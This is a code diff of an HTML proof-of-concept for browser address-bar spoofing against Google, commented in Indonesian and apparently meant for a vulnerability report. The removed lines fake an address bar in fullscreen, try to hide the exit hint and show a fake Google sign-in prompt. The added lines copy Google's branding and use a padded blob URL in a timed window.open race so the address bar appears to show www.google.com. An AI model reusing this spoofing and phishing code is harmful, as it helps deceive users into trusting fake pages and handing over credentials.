@@ -1,64 +1,50 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Google</title>
+<meta charset="utf-8">
+<title>Homepage</title>
 <style>
-  html,body{margin:0;height:100%;font-family:Arial,sans-serif;background:#fff;overflow:hidden}
-  #fakebar{position:fixed;top:0;left:0;right:0;height:80px;background:#f1f3f4;
-    display:flex;align-items:center;padding:0 12px;z-index:99999;box-shadow:0 1px 3px rgba(0,0,0,.2)}
-  #fakeurl{background:#fff;border-radius:24px;height:36px;flex:1;max-width:600px;margin:0 auto;
-    display:flex;align-items:center;padding:0 16px;color:#5f6368;font-size:14px;
-    box-shadow:inset 0 0 0 1px #dadce0}
-  #fakeurl::before{content:"🔒";margin-right:8px;font-size:12px}
-  #page{position:fixed;top:80px;left:0;right:0;bottom:0;display:flex;flex-direction:column;
-    align-items:center;padding-top:15vh}
-  .logo{font-size:64px;font-weight:600;letter-spacing:-2px}
-  .logo span:nth-child(1){color:#4285f4}.logo span:nth-child(2){color:#ea4335}
-  .logo span:nth-child(3){color:#fbbc05}.logo span:nth-child(4){color:#4285f4}
-  .logo span:nth-child(5){color:#34a853}.logo span:nth-child(6){color:#ea4335}
-  .search{margin-top:32px;width:480px;height:44px;border:1px solid #dfe1e5;border-radius:24px;
-    padding:0 20px;font-size:16px;outline:none}
-  .creds{margin-top:40px;color:#1a73e8;font-size:14px;cursor:pointer}
+  body { margin:0; font-family: arial, sans-serif; }
+  .bar { padding:8px 20px; background:#f1f1f1; border-bottom:1px solid #ddd; }
+  .bar a { color:#1a0dab; text-decoration:none; font-size:13px; }
 </style>
 </head>
 <body>
-<div id="fakebar">
-  <div style="display:flex;gap:10px;align-items:center;flex:1">
-    <span style="color:#5f6368">⬅️</span><span style="color:#5f6368">➡️</span><span style="color:#5f6368">🔄</span>
-    <div id="fakeurl">https://www.google.com</div>
-    <span style="color:#5f6368">👤</span>
-  </div>
+<div class="bar">
+  <!-- Replika tampilan atas halaman Google Search supaya lebih meyakinkan -->
+  <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+  <a href="#">Gmail</a> | <a href="#">Images</a> | <a href="#">Sign in</a>
 </div>
-<div id="page">
-  <div class="logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
-  <input class="search" placeholder="Search Google or type a URL">
-  <div class="creds" onclick="stealFlow()">Sign in to Google</div>
+<div style="padding:60px 20px; text-align:center;">
+  <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google logo">
+  <br><br>
+  <input type="text" size="40" placeholder="Search Google or type a URL">
+  <br><br>
+  <button>Google Search</button>
+  <button>I'm Feeling Lucky</button>
 </div>
 <script>
-// FASE 1: user gesture wajib untuk fullscreen
-document.addEventListener("click", async function once() {
-  document.removeEventListener("click", once);
-  try {
-    await document.documentElement.requestFullscreen();
-    // Fullscreen aktif -> address bar asli hilang, fakebar menggantikan
-    // TES: cek apakah UI "press Esc to exit fullscreen" bisa dihilangkan/ditutupi
-    setTimeout(() => {
-      // banyak browser menyembunyikan hint setelah beberapa detik;
-      // beberapa versi bisa dipaksa repaint penuh agar hint tak terlihat:
-      document.body.style.transform = "scale(1.001)";
-      requestAnimationFrame(() => document.body.style.transform = "");
-    }, 3500);
-  } catch(e) { alert("Fullscreen ditolak: " + e.message); }
-});
+  // Langkah 1: buat blob URL dengan "padding" panjang + string google.com palsu
+  // pada posisi yang TIDAK ter-elide di address bar.
+  // Padding harus panjang sehingga bagian depan blob URL (yang berisi
+  // origin attacker) ter-elide, dan sisa terlihat adalah teks yang kita kontrol.
+  const padding = 'a'.repeat(500);
+  const fakeOrigin = '.www.google.com/search?q=';
 
-function stealFlow() {
-  // Halaman "login Google" palsu — di laporan, jelaskan flow phising-nya
-  document.getElementById("page").innerHTML =
-    "<div style='text-align:center;margin-top:20vh'><h2 style='font-weight:400'>Sign in</h2>" +
-    "<p>to continue to <b>Google</b></p>" +
-    "<input placeholder='Email or phone' style='padding:12px;width:280px;border:1px solid #dadce0;border-radius:4px'>" +
-    "<br><br><button style='background:#1a73e8;color:#fff;border:0;padding:10px 24px;border-radius:4px'>Next</button></div>";
-}
+  // Langkah 2: buat konten spoof di dalam blob agar navigasi commit ke blob
+  // dan address bar menampilkan blob URL (bukan halaman attacker asli).
+  const spoofHTML = document.documentElement.outerHTML;
+  const blob = new Blob([spoofHTML], {type: 'text/html'});
+  const blobURL = URL.createObjectURL(blob);
+
+  // Langkah 3: race — navigasi window.open lalu replace ke blob dengan padding.
+  const w = window.open('https://www.google.com');
+  setTimeout(() => {
+    // URL final di address bar: blob:https://attacker-domain/...<padding>www.google.com/...
+    // Chrome meng-elide host yang panjang sehingga yang terlihat di address bar
+    // adalah "...www.google.com/..." -> tampak seperti halaman Google.
+    w.location = blobURL.replace('blob:', 'blob:/' + padding + fakeOrigin + '/');
+  }, 300);
 </script>
 </body>
 </html>
